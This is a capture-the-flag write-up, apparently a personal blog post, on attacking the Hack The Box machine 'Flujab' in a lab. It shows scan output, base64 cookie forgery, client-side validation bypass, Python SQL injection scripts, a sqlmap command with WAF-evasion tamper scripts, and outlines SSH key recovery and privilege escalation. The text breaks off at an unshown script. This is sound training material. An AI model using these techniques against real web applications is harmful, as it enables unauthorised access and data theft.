<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Flujab - Hack The Box - hackcommander.io</title>
<meta name="description" content="Flujab was without a doubt one of the toughest HTB box. It’s got a ton of vhosts that force you to enumerate a lot of things and make sure you don’t get distracted by the quantity of decoys and trolls left around. The key on this box is to stay ‘in scope’ as the box author hinted at before the box was released, so that means enumerating two specific domains without getting distracted by all the other stuff on the box.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Flujab - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-flujab/">


  <meta property="og:description" content="Flujab was without a doubt one of the toughest HTB box. It’s got a ton of vhosts that force you to enumerate a lot of things and make sure you don’t get distracted by the quantity of decoys and trolls left around. The key on this box is to stay ‘in scope’ as the box author hinted at before the box was released, so that means enumerating two specific domains without getting distracted by all the other stuff on the box.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-flujab/flujab_logo.png">





  <meta property="article:published_time" content="2019-06-15T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-flujab/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Flujab - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Flujab - Hack The Box">
    <meta itemprop="description" content="Flujab was without a doubt one of the toughest HTB box. It’s got a ton of vhosts that force you to enumerate a lot of things and make sure you don’t get distracted by the quantity of decoys and trolls left around. The key on this box is to stay ‘in scope’ as the box author hinted at before the box was released, so that means enumerating two specific domains without getting distracted by all the other stuff on the box.">
    <meta itemprop="datePublished" content="June 15, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Flujab - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-06-15T00:00:00+02:00">June 15, 2019 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-flujab/flujab_logo.png" alt="" /></p>

<p>Flujab was without a doubt one of the toughest HTB box. It’s got a ton of vhosts that force you to enumerate a lot of things and make sure you don’t get distracted by the quantity of decoys and trolls left around. The key on this box is to stay ‘in scope’ as the box author hinted at before the box was released, so that means enumerating two specific domains without getting distracted by all the other stuff on the box.</p>

<p>The hard part of the box is the SQL injection that forces you to exploit it manually or to write your own WAF evasion tamper scripts in SQLmap because the box author hardcoded some string substition in the code to defeat people blindly runnning sqlmap. This box is also rather unique because the output of the SQL queries is not seen on the web page where the query is sent but rather in an email received by SMTP, so we have to use a 2nd order SQL injection option in sqlmap or write custom code to handle this.</p>

<p>When I did the box, I initially found the information I was looking for in the database but overlooked at critical column in the table row that contained the next step for getting access to the box. Eventually I found the web administation panel and was able to get access via SSH, using keys generated by Debian’s weak PRNG. This was a vulnerability that I remembered when I did my OSCP.</p>

<p>The priv esc was a nice one also, thankfully one of the <code class="language-plaintext highlighter-rouge">screen</code> binary seemed out of place a little bit which tipped me off otherwise it would have taken me much longer to find it.</p>

<h2 id="summary">Summary</h2>

<ul>
  <li>Enumerate all the vhosts (based on the information in the SSL certificate’s SAN), concentrating only on <code class="language-plaintext highlighter-rouge">freeflujab.htb</code></li>
  <li>Observe that the page sets a <code class="language-plaintext highlighter-rouge">Modus</code> cookie with a path of <code class="language-plaintext highlighter-rouge">/?smtp_config</code></li>
  <li>Figure out that the Cookie is just a base64 encoded value of <code class="language-plaintext highlighter-rouge">Configure=Null</code>, and that we can change it to a <code class="language-plaintext highlighter-rouge">True</code></li>
  <li>Use the SMTP administration panel to set the SMTP server IP to our own IP address</li>
  <li>Find that the <code class="language-plaintext highlighter-rouge">?remind</code>, <code class="language-plaintext highlighter-rouge">?cancel</code>, and <code class="language-plaintext highlighter-rouge">?book</code> pages send an email which we can receive by running a local SMTP server on our machine</li>
  <li>The webpage code contains a Boolean Blind SQL injection and a Union based SQL injection, both of which can be exploited through the email responses</li>
  <li>There is a WAF in place that will block certain SQL keywords like <code class="language-plaintext highlighter-rouge">CASE</code>, <code class="language-plaintext highlighter-rouge">0x</code> and <code class="language-plaintext highlighter-rouge">ALL</code> so we need to use tamper scripts to bypass that</li>
  <li>After dumping the <code class="language-plaintext highlighter-rouge">vaccinations</code> database, we find an entry in the <code class="language-plaintext highlighter-rouge">admin</code> table containing the administration panel URL</li>
  <li>We can log in to the web admin panel using the credentials found in the database, then we have read access to files on the filesystem</li>
  <li>There is a user <code class="language-plaintext highlighter-rouge">drno</code> which has an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file in his folder, and there is a note in <code class="language-plaintext highlighter-rouge">/etc/ssh/deprecated_keys</code> that mentions old weak keys</li>
  <li>This leads to one of Debian’s old vulnerability where a weak PRNG can be exploited for recovering private keys based on the public key’s signature</li>
  <li>After recovering the private key, log in as <code class="language-plaintext highlighter-rouge">drno</code> then eventually find the <code class="language-plaintext highlighter-rouge">screen</code> version running is vulnerable to a local privilege escalation</li>
</ul>

<h2 id="toolsblogs-used">Tools/Blogs used</h2>

<ul>
  <li><a href="https://github.com/g0tmi1k/debian-ssh">https://github.com/g0tmi1k/debian-ssh</a></li>
  <li><a href="https://www.exploit-db.com/exploits/41154">https://www.exploit-db.com/exploits/41154</a></li>
</ul>

<h2 id="detailed-steps">Detailed steps</h2>

<h3 id="port-scan">Port scan</h3>

<p>Starting with the usual portscan, we only find a handful of ports open on this machine: 22, 80, 443 and 8080.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -p- -sC -sV 10.10.10.124
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-29 22:20 EST
Nmap scan report for clownware.htb (10.10.10.124)
Host is up (0.019s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh?
80/tcp   open  http     nginx
|_http-server-header: ClownWare Proxy
|_http-title: Did not follow redirect to https://clownware.htb/
443/tcp  open  ssl/http nginx
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Not valid before: 2018-11-28T14:57:03
|_Not valid after:  2023-11-27T14:57:03
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  ssl/http nginx
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Not valid before: 2018-11-28T14:57:03
|_Not valid after:  2023-11-27T14:57:03
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
</code></pre></div></div>

<p>The first thing I noticed is the certificate Subject Alternative Name field that contains many different domains and sub-domains. I added those to my local host file so I could enumerate all those vhosts.</p>

<p>The other item I noted was the SSH service didn’t respond with a banner. I manually checked and confirmed that even through port 22 is open, there is no response sent back by the server. This would likely indicate either a “fake/troll service” running on this port or perhaps a whitelist wrapper of some sort configured on the port.</p>

<h3 id="web-enumeration">Web enumeration</h3>

<p>This box contains a large amount of vhosts as shown in the certificate SAN:</p>

<ul>
  <li>clownware.htb</li>
  <li>sni147831.clownware.htb</li>
  <li>proxy.clownware.htb</li>
  <li>console.flujab.htb</li>
  <li>sys.flujab.htb</li>
  <li>smtp.flujab.htb</li>
  <li>vaccine4flu.htb</li>
  <li>bestmedsupply.htb</li>
  <li>custoomercare.megabank.htb</li>
  <li>flowerzrus.htb</li>
  <li>chocolateriver.htb</li>
  <li>meetspinz.htb</li>
  <li>rubberlove.htb</li>
  <li>freeflujab.htb</li>
  <li>flujab.htb</li>
</ul>

<p>The box creator gave a small public hint in the HTB forums just before the box was released:</p>

<blockquote>
  <p>The mindset of this box is designed as follows:</p>

  <p>Treat it as a box a pentester may be tasked to look at on the real internet.</p>

  <p>Think of the box name as a kind of scope.</p>
</blockquote>

<p>So based on the name of box, I narrowed my search to the <code class="language-plaintext highlighter-rouge">flujab.htb</code> and <code class="language-plaintext highlighter-rouge">freeflujab.htb</code> domains. But just for sake of completeness, the following section contains the useless websites and trolls I found on the box.</p>

<h3 id="useless-websites-and-trolling">Useless websites and trolling</h3>

<p><strong>bestmedsupply.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/bestmedsupply.png" alt="" /></p>

<p><strong>chocolateriver.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/chocolateriver.png" alt="" /></p>

<p><strong>custoomercare.megabank.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/custoomercare.png" alt="" /></p>

<p><strong>flowerzrus.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/flowerzrus.png" alt="" /></p>

<p><strong>meetspinz.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/meetspinz.png" alt="" /></p>

<p><strong>rubberlove.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/rubberlove.png" alt="" /></p>

<p><strong>vaccine4flu.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/vaccine4flu.png" alt="" /></p>

<p><strong>console.flujab.htb</strong></p>

<p><img src="/assets/images/htb-writeup-flujab/console.png" alt="" /></p>

<h3 id="non-functional-smtp-website">Non-functional SMTP website</h3>

<p>The <code class="language-plaintext highlighter-rouge">smtp.flujab.htb</code> website contains a login form, this looks very interesting… Or not as it turns out.</p>

<p><img src="/assets/images/htb-writeup-flujab/smtp_fake.png" alt="" /></p>

<p>I thought there was a SQL injection of some sort on there but I quickly saw that the form doesn’t do anything when you click to sign in. When we look at the code, we can see that it’s badly broken and doesn’t do anything when we submit the form.</p>

<p><img src="/assets/images/htb-writeup-flujab/smtp_code1.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-flujab/smtp_code2.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">api</code> call shown above is missing the closing parantheses, plus other functions are missing such as shown_modal_error(). This whole code is basically useless. I tried fuzzing the site to find a hidden API endpoint but didn’t find any.</p>

<p>I found a <code class="language-plaintext highlighter-rouge">/README</code> file on the site that confirmed that this site is no longer used:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   -------------------------------------
   This Service has been decommissioned!
   -------------------------------------

Administrators can now use the configuration 
section of the new free service application.
</code></pre></div></div>

<p>Let’s move on to the  <code class="language-plaintext highlighter-rouge">freeflujab.htb</code> site.</p>

<h3 id="enumerating-the-real-target-website">Enumerating the real target website</h3>

<p>The <strong>freeflujab.htb</strong> website is an healthcare information site about the Flu where patients can register, book, cancel or send a reminder for appoinments.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab1.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab2.png" alt="" /></p>

<p><strong>Registration: <code class="language-plaintext highlighter-rouge">?reg</code></strong></p>

<p>The registration doesn’t work when registering a user, we can an error message about a connection error to the mailserver. The website errors out when it tries to send an email after the registration.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_reg1.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_reg2.png" alt="" /></p>

<p><strong>Booking: <code class="language-plaintext highlighter-rouge">?book</code></strong></p>

<p>The booking page also doesn’t work for us because we don’t have a valid patient name to book an appointment.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_book1.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_book2.png" alt="" /></p>

<p><strong>Cancel: <code class="language-plaintext highlighter-rouge">?cancel</code></strong></p>

<p>We can’t get to the cancelation page as it redirects us to <code class="language-plaintext highlighter-rouge">?ERROR=NOT_REGISTERED</code> automatically.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_cancel1.png" alt="" /></p>

<p>The next thing I did was check the cookies I had since the registration status must be stored in a session on the server-side or in a client cookie.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_cookies1.png" alt="" /></p>

<p>The content of the <code class="language-plaintext highlighter-rouge">Modus</code> and <code class="language-plaintext highlighter-rouge">Registered</code> cookies are simply Base64 encoded:</p>

<ul>
  <li>Modus: <code class="language-plaintext highlighter-rouge">Q29uZmlndXJlPU51bGw%3D</code> = <code class="language-plaintext highlighter-rouge">Configure=Null</code></li>
  <li>Patient: <code class="language-plaintext highlighter-rouge">ea879301202391042cd783affa29f92a</code> =</li>
  <li>Registered: <code class="language-plaintext highlighter-rouge">ZWE4NzkzMDEyMDIzOTEwNDJjZDc4M2FmZmEyOWY5MmE9TnVsbA%3D%3D</code> = <code class="language-plaintext highlighter-rouge">ea879301202391042cd783affa29f92a=Null</code></li>
</ul>

<p>By changing the <code class="language-plaintext highlighter-rouge">Registered</code> cookie to <code class="language-plaintext highlighter-rouge">ea879301202391042cd783affa29f92a=True</code>, we are able to access the cancelation page:</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_cancel2.png" alt="" /></p>

<p>But we get the same SMTP error message when trying to cancel an appointment:</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_cancel3.png" alt="" /></p>

<p>Then I noticed in the cookies that there is a cookie set for the <code class="language-plaintext highlighter-rouge">/?smtp_config</code> path. If we try to connect to it, we get redirected to <code class="language-plaintext highlighter-rouge">https://freeflujab.htb/?denied</code>. But if we change the <code class="language-plaintext highlighter-rouge">Configure=Null</code> cookie value to <code class="language-plaintext highlighter-rouge">Configure=True</code> we are able to access the SMTP configuration page.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_smtpconfig1.png" alt="" /></p>

<p>We can’t set the server address to our own IP address:</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_smtpconfig2.png" alt="" /></p>

<p>But the validation is performed client-side so we can just use Burp to change the <code class="language-plaintext highlighter-rouge">smtp.flujab.htb</code> value for our IP address:</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_smtpconfig3.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_smtpconfig4.png" alt="" /></p>

<p>There’s also a link to see the whitelisted sysadmins but we get a denied redirection when we click on it. The problem is the <code class="language-plaintext highlighter-rouge">Configure=True</code> cookie has been set to the <code class="language-plaintext highlighter-rouge">/?smtp_config</code> path. If we change the path of the cookie to <code class="language-plaintext highlighter-rouge">/</code> we can access the whitelist page.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_whitelist1.png" alt="" /></p>

<p>Changing the SMTP server address adds our IP address automatically to the whitelist. Later this same whitelist is used to allow access to the web administation panel so if the box gets reverted, we need to go back to the SMTP configuration page and change the SMTP server address again otherwise our IP can’t access the admin panel.</p>

<p><strong>Remind: <code class="language-plaintext highlighter-rouge">?remind</code></strong></p>

<p>The last useful link on the page is used to send appointment reminders.</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_remind1.png" alt="" /></p>

<p>Now that we have configured a valid SMTP address, we can send a reminder (we can choose any NHS number, it doesn’t need to exist in the database)… But we get an error message:</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_remind2.png" alt="" /></p>

<p>The form doesn’t contain an email address field, but we can intercept the request with Burp and add it ourselves:</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_remind3.png" alt="" /></p>

<p>We can use the python smtpd module to run an SMTP server in Kali and receive the email:</p>

<p><img src="/assets/images/htb-writeup-flujab/freeflujab_remind4.png" alt="" /></p>

<h3 id="sql-injection">SQL injection</h3>

<p>The email itself doesn’t contain anything useful, so the next step is to fuzz the <code class="language-plaintext highlighter-rouge">nhsnum</code> input and look for an SQL injection. Instead of doing it manually through Burp, I made a quick script to speed up the process.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>

    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"Patient=ea879301202391042cd783affa29f92a;Registered=ZWE4NzkzMDEyMDIzOTEwNDJjZDc4M2FmZmEyOWY5MmE9VHJ1ZQ=="</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"nhsnum"</span><span class="p">:</span> <span class="s">"{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span>
        <span class="s">"email"</span><span class="p">:</span> <span class="s">"test@test.com"</span><span class="p">,</span>
        <span class="s">"submit"</span><span class="p">:</span> <span class="s">"Send+Reminder"</span>   
    <span class="p">}</span>

    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://127.0.0.1:8080'</span><span class="p">,</span>
    <span class="s">'https'</span><span class="p">:</span> <span class="s">'http://127.0.0.1:8080'</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">before</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s">"https://freeflujab.htb/?remind"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="n">after</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
    <span class="n">delta</span> <span class="o">=</span> <span class="n">after</span><span class="o">-</span><span class="n">before</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Response time: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">delta</span><span class="p">))</span>
</code></pre></div></div>

<p>After fuzzing for a bit, I found a UNION based injection where the <code class="language-plaintext highlighter-rouge">Ref:</code> field in the subject header contains the return value from the 3rd column.</p>

<p><img src="/assets/images/htb-writeup-flujab/sql1.png" alt="" /></p>

<p>I wanted to use sqlmap to enumerate the database but I had a problem since sqlmap doesn’t “see” the responses from the queries since they come by email through the SMTP server. So what I did was create a small script to pipe the content of <code class="language-plaintext highlighter-rouge">Ref:</code> field in the Subject header to a file in my Apache server root directory:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="nn">asyncore</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">smtpd</span> <span class="kn">import</span> <span class="n">SMTPServer</span>

<span class="k">class</span> <span class="nc">EmlServer</span><span class="p">(</span><span class="n">SMTPServer</span><span class="p">):</span>
    <span class="n">no</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">def</span> <span class="nf">process_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">peer</span><span class="p">,</span> <span class="n">mailfrom</span><span class="p">,</span> <span class="n">rcpttos</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="s">'/var/www/html/test.txt'</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
                <span class="c1"># print line 
</span>            <span class="k">if</span> <span class="s">'Ref:'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>  
                <span class="k">print</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'Ref:'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'Ref:'</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
            <span class="n">f</span><span class="p">.</span><span class="n">close</span>
        <span class="k">print</span> <span class="s">'Message %d, %s saved.'</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">no</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">no</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="n">foo</span> <span class="o">=</span> <span class="n">EmlServer</span><span class="p">((</span><span class="s">'10.10.14.23'</span><span class="p">,</span> <span class="mi">25</span><span class="p">),</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">asyncore</span><span class="p">.</span><span class="n">loop</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">pass</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">run</span><span class="p">()</span>
</code></pre></div></div>

<p>Then I used the <code class="language-plaintext highlighter-rouge">--second-url</code> option in sqlmap to make it check my local webserver for the query reponse. I added a tamper script first in the chain so it wipes the content of the reponse file, so that if the query errors out on the server it doesn’t cause a false positive.</p>

<p><strong>delete.py</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/var/www/html/test.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
    <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">retVal</span>
</code></pre></div></div>

<p>I then used the following sqlmap command: <code class="language-plaintext highlighter-rouge">sqlmap --threads 1 -r /root/htb/flujab/flujab.req --risk=3 -p nhsnum --random-agent --proxy=http://127.0.0.1:8080 --second-url http://127.0.0.1/test.txt --tamper delete --force-ssl --technique u --union-cols 5 --union-char 1 -vv --suffix " #" --dbms=mysql --flush-session</code></p>

<p>But I had problems getting sqlmap working correctly, for some reason even when I gave it the correct number of columns it didn’t find the injection point.</p>

<p><img src="/assets/images/htb-writeup-flujab/sql2.png" alt="" /></p>

<p>Then I remembered that on some of the webpages there was a <code class="language-plaintext highlighter-rouge">Protected By ClownWare.htb</code> message at the bottom. So I figured there was a WAF messing with some of the parameters sent to the server.</p>

<p>After playing with the queries manually, I found that <code class="language-plaintext highlighter-rouge">ALL</code>, <code class="language-plaintext highlighter-rouge">0x</code> and <code class="language-plaintext highlighter-rouge">CASE</code> keywords are modified by the server:</p>

<p><img src="/assets/images/htb-writeup-flujab/sql3.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-flujab/sql4.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-flujab/sql5.png" alt="" /></p>

<p>For the <code class="language-plaintext highlighter-rouge">ALL</code> and <code class="language-plaintext highlighter-rouge">0x</code> statements, I used the <code class="language-plaintext highlighter-rouge">unionalltounion</code> and <code class="language-plaintext highlighter-rouge">0x2char</code> tamper scripts already included in sqlmap but for <code class="language-plaintext highlighter-rouge">CASE</code> I made my own script to replace it with an <code class="language-plaintext highlighter-rouge">IF</code> statement:</p>

<p><strong>case.py</strong></p>

